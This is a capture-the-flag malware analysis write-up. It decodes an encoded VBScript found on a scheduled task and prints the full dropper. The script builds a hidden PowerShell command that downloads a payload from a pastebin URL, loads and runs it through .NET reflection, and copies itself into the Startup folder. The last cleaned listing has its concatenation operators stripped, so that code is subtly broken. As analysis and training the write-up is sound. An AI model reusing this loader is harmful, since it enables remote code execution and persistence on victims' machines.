# VeeBeeEee

## Description
```
While investigating a host, we found this strange file attached to a scheduled task. It was invoked with wscript or something... can you find a flag?
```

## Writeup

This is a maleware analysis challenge. <br/>
In the description we see that the maleware was invoked with `wscript`. <br/>
Taking a look at the file in general:
```sh
kali@kali file veebeeeee 
veebeeeee: data
```

Doing anything more like piping the file into the terminal with cat we just get random characters. <br/>
So now I just uploaded the file into cyberchef. Cyberchef outputs that it can be decoded with Microsoft_Script_Decoder(). <br/>
Knowing this I searched up Microsoft_Script_Decoders online and found a certain github repository. (https://github.com/sstraw/scrdec) <br/>
Decoding the script:
```sh
python3 scrdec.py -i ../veebeeeee -o decoded.vbs
Traceback (most recent call last):
  File "/home/kali/Desktop/VeeBeeEee/scrdec/scrdec.py", line 186, in <module>
    main()
  File "/home/kali/Desktop/VeeBeeEee/scrdec/scrdec.py", line 111, in main
    r = decode(inputBuf, outputBuf)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Desktop/VeeBeeEee/scrdec/scrdec.py", line 35, in decode
    c = ESCAPE_CHARS[ESCAPE_REPRS.index(c)]
                     ^^^^^^^^^^^^^^^^^^^^^
ValueError: '\x00' is not in list
```

Although I got an error it seems like the file was successfully decoded as I can pipe the decoded file into my terminal:
```vbs
Set Object  = WScript.CreateObject("WScript.Shell") ''''''''''''''''al37ysoeopm'al37ysoeopm
Set SObject = CreateObject("Shell.Application")''''''''''''''''al37ysoeopm'al37ysoeopm
Set FObject = CreateObject("Scripting.FileSystemObject")''''''''''''''''al37ysoeopm'al37ysoeopm
SPath   = WScript.ScriptFullName''''''''''''''''al37ysoeopm'al37ysoeopm
Dim Code''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
Power0 = "Po"''''''''''''''''al37ysoeopm'al37ysoeopm
Power1 = "we"''''''''''''''''al37ysoeopm'al37ysoeopm
Power2 = "rS"''''''''''''''''al37ysoeopm'al37ysoeopm
Power3 = "he"
Power4 = "ll"''''''''''''''''al37ysoeopm'al37ysoeopm
Power5 = " "''''''''''''''''al37ysoeopm'al37ysoeopm
Power = Power0 + Power1 + Power2 + Power3 + Power4 + Power5''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
Path0 = "&$&f&&=&'&&C&"''''''''''''''''al37ysoeopm'al37ysoeopm
Path1 = "&:&\&U&s&e&&rs" ''''''''''''''''al37ysoeopm'al37ysoeopm
Path2 = "&\P&&u&b&l&i&&c&"''''''''''''''''al37ysoeopm'al37ysoeopm
Path3 = "\D&&o&c&u&me" ''''''''''''''''al37ysoeopm'al37ysoeopm
Path4 = "n&ts&\&&J&u&ly"''''''''''''''''al37ysoeopm'al37ysoeopm
Path5 = "&.h&t&&m&';"''''''''''''''''al37ysoeopm'al37ysoeopm
Path   = Path0 + Path1 + Path2 + Path3 + Path4 + Path5''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest0 = "&i&&f &(&!(T&e&st&-P&ath &$&f)&){&&I&n&v&o&ke&-&W&eb&&R&eq&u&&e&s&t '"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest1 = "&h&t&t&p&s&:&/&/&p&a&s&t"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest2 = "&e&b&i&n&.&c&o&m&/&r&a&w"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest3 = "&/&S&i&Y&G&w&w&c&z&"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest4 = "'& &-o&u&"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest5 = "t&f&i&le &$f&  &};"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest = Reqest0 + Reqest1 + Reqest2 +  Reqest3 + Reqest4 + Reqest5''''''''''''''''al37ysoeopm'al37ysoeopm
PathString = SObject.NameSpace(7).Self.Path & "/" & WScript.ScriptName''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest0 = "&[&S&y&s&t&e&m&."''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest1 = "&R&e&f&l&e&c&t&i&"''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest2 = "o&n&.&A&s&s&e&m&b&l"''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest3 = "&y&]&:&:&l&o&a&d&f" ''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest4 = "&i&l&e(&$&"''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest5 = "f&)&;&"''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest = InvokeReqest0 + InvokeReqest1 + InvokeReqest2 + InvokeReqest3 + InvokeReqest4 + InvokeReqest5''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem0 = "&[&W&o&r&k"''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem1 = "&A&r&e&a&."''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem2 = "&W&o&&r&k"''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem3 = "]&:&"''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem4 = ":&E&x&" ''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem5 = "e(&)&"''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem   = ExecAssem0 + ExecAssem1 + ExecAssem2 + ExecAssem3 + ExecAssem4 + ExecAssem5''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
CollectThenReplace Power , Path , Reqest , InvokeReqest , ExecAssem
''''''''''''''''al37ysoeopm'al37ysoeopm

Sub CollectThenReplace(First, Second , Third , Fourth , Fifth)''''''''''''''''al37ysoeopm'al37ysoeopm
Temp = First + Second + Third + Fourth + Fifth''''''''''''''''al37ysoeopm'al37ysoeopm
Code = Replace(Temp , "&" , "" )''''''''''''''''al37ysoeopm'al37ysoeopm
End Sub''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
Return = Object.Run(Code, 0, true)''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
WScript.Sleep(50000)''''''''''''''''al37ysoeopm'al37ysoeopm
For i = 1 To 5''''''''''''''''al37ysoeopm'al37ysoeopm
if i = 5 Then''''''''''''''''al37ysoeopm'al37ysoeopm
Paste(SPath)
End if''''''''''''''''al37ysoeopm'al37ysoeopm
Next''''''''''''''''al37ysoeopm'al37ysoeopm
Sub Paste(RT)
FObject.CopyFile RT,PathString
End Subz&;'Bw:`l),                         
```

After a bit of deobfuscation I got the following result:
```vbs
Set Object = WScript.CreateObject("WScript.Shell")
Set SObject = CreateObject("Shell.Application")
Set FObject = CreateObject("Scripting.FileSystemObject")
SPath = WScript.ScriptFullName
Dim Code

Power0 = "Po"
Power1 = "we"
Power2 = "rS"
Power3 = "he"
Power4 = "ll"
Power5 = " "
Power = Power0 + Power1 + Power2 + Power3 + Power4 + Power5

Path0 = "&$&f&&=&'&&C&"
Path1 = "&:&\&U&s&e&&rs"
Path2 = "&\P&&u&b&l&i&&c&"
Path3 = "\D&&o&c&u&me"
Path4 = "n&ts&\&&J&u&ly"
Path5 = "&.h&t&&m&';"
Path = Path0 + Path1 + Path2 + Path3 + Path4 + Path5

Reqest0 = "&i&&f &(&!(T&e&st&-P&ath &$&f)&){&&I&n&v&o&ke&-&W&eb&&R&eq&u&&e&s&t '"
Reqest1 = "&h&t&t&p&s&:&/&/&p&a&s&t"
Reqest2 = "&e&b&i&n&.&c&o&m&/&r&a&w"
Reqest3 = "&/&S&i&Y&G&w&w&c&z&"
Reqest4 = "'& &-o&u&"
Reqest5 = "t&f&i&le &$f&  &};"
Reqest = Reqest0 + Reqest1 + Reqest2 +  Reqest3 + Reqest4 + Reqest5

PathString = SObject.NameSpace(7).Self.Path & "/" & WScript.ScriptName

InvokeReqest0 = "&[&S&y&s&t&e&m&."
InvokeReqest1 = "&R&e&f&l&e&c&t&i&"
InvokeReqest2 = "o&n&.&A&s&s&e&m&b&l"
InvokeReqest3 = "&y&]&:&:&l&o&a&d&f"
InvokeReqest4 = "&i&l&e(&$&"
InvokeReqest5 = "f&)&;&"
InvokeReqest = InvokeReqest0 + InvokeReqest1 + InvokeReqest2 + InvokeReqest3 + InvokeReqest4 + InvokeReqest5

ExecAssem0 = "&[&W&o&r&k"
ExecAssem1 = "&A&r&e&a&."
ExecAssem2 = "&W&o&&r&k"
ExecAssem3 = "]&:&"
ExecAssem4 = ":&E&x&"
ExecAssem5 = "e(&)&"
ExecAssem = ExecAssem0 + ExecAssem1 + ExecAssem2 + ExecAssem3 + ExecAssem4 + ExecAssem5

CollectThenReplace Power, Path, Reqest, InvokeReqest, ExecAssem

Sub CollectThenReplace(First, Second, Third, Fourth, Fifth)
    Temp = First + Second + Third + Fourth + Fifth
    Code = Replace(Temp, "&", "")
End Sub

Return = Object.Run(Code, 0, True)

WScript.Sleep(50000)

For i = 1 To 5
    If i = 5 Then
        Paste SPath
    End If
Next

Sub Paste(RT)
    FObject.CopyFile RT, PathString
End Sub
```

Now this leaves us with some letters surrounded by `&` so let's go to cyberchef again and cut them:
```vbs
Set Object = WScript.CreateObject("WScript.Shell")
Set SObject = CreateObject("Shell.Application")
Set FObject = CreateObject("Scripting.FileSystemObject")
SPath = WScript.ScriptFullName
Dim Code

Power0 = "Po"
Power1 = "we"
Power2 = "rS"
Power3 = "he"
Power4 = "ll"
Power5 = " "
Power = Power0 + Power1 + Power2 + Power3 + Power4 + Power5

Path0 = "$f='C"
Path1 = ":\Users"
Path2 = "\Public"
Path3 = "\Docume"
Path4 = "nts\July"
Path5 = ".htm';"
Path = Path0 + Path1 + Path2 + Path3 + Path4 + Path5

Reqest0 = "if (!(Test-Path $f)){Invoke-WebRequest '"
Reqest1 = "https://past"
Reqest2 = "ebin.com/raw"
Reqest3 = "/SiYGwwcz"
Reqest4 = "' -ou"
Reqest5 = "tfile $f  };"
Reqest = Reqest0 + Reqest1 + Reqest2 +  Reqest3 + Reqest4 + Reqest5

PathString = SObject.NameSpace(7).Self.Path  "/"  WScript.ScriptName

InvokeReqest0 = "[System."
InvokeReqest1 = "Reflecti"
InvokeReqest2 = "on.Assembl"
InvokeReqest3 = "y]::loadf"
InvokeReqest4 = "ile($"
InvokeReqest5 = "f);"
InvokeReqest = InvokeReqest0 + InvokeReqest1 + InvokeReqest2 + InvokeReqest3 + InvokeReqest4 + InvokeReqest5

ExecAssem0 = "[Work"
ExecAssem1 = "Area."
ExecAssem2 = "Work"
ExecAssem3 = "]:"
ExecAssem4 = ":Ex"
ExecAssem5 = "e()"
ExecAssem = ExecAssem0 + ExecAssem1 + ExecAssem2 + ExecAssem3 + ExecAssem4 + ExecAssem5

CollectThenReplace Power, Path, Reqest, InvokeReqest, ExecAssem

Sub CollectThenReplace(First, Second, Third, Fourth, Fifth)
    Temp = First + Second + Third + Fourth + Fifth
    Code = Replace(Temp, "", "")
End Sub

Return = Object.Run(Code, 0, True)

WScript.Sleep(50000)

For i = 1 To 5
    If i = 5 Then
        Paste SPath
    End If
Next

Sub Paste(RT)
    FObject.CopyFile RT, PathString
End Sub
```

here I found the IP `https://pastebin.com/raw/SiYGwwcz` to whic hwe can send a curl request and finally get the following:
```sh
curl https://pastebin.com/raw/SiYGwwcz
<!-- flag{ed81d24958127a2adccfb343012cebff} -->
```
